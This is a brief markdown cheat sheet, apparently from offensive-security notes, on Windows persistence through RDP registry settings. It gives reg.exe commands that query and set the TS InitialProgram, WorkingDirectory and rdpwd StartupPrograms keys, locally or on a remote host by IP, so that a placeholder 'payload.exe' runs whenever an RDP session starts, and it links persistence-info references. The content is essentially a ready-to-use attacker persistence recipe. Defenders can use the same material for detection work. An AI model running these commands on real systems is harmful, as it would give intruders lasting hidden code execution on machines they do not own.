# RDP

## TS Initial Program

If it's set to `0x1` then it indicates the RDP is enabled.

```
C:\> reg.exe query "[\\<IP>\]HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fInheritInitialProgram

C:\> reg.exe query "[\\<IP>\]HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v fInheritInitialProgram
```

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /t REG_SZ /v InitialProgram /d "C:\path\to\payload.exe"

C:\> reg.exe add "[\\<IP>\]HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_SZ /v InitialProgram /d "C:\path\to\payload.exe"
```

> [!NOTE]
> This is optional.

Set the working directory.

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /t REG_SZ /v WorkingDirectory /d "C:\Windows\System32"

C:\> reg.exe add "[\\<IP>\]HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_SZ /v WorkingDirectory /d "C:\Windows\System32"
```

## RDP WDS Startup Programs

```
C:\> reg.exe query "[\\<IP>\]HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\StartupPrograms"
```

You can specify multiple values separate with comas (`,`) and **without** spaces.

```
C:\> reg.exe add "[\\<IP>\]HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\StartupPrograms" /t REG_MULTI_SZ /v <value> /d "C:\path\to\payload_1.exe,C:\path\to\payload_n.exe"
```

---
## References

### Persistence Info

- [Persistence Info: TS Initial Program](https://persistence-info.github.io/Data/tsinitialprogram.html)

- [Persistence Info: RDP WDS Startup Programs](https://persistence-info.github.io/Data/rdpwdstartupprograms.html)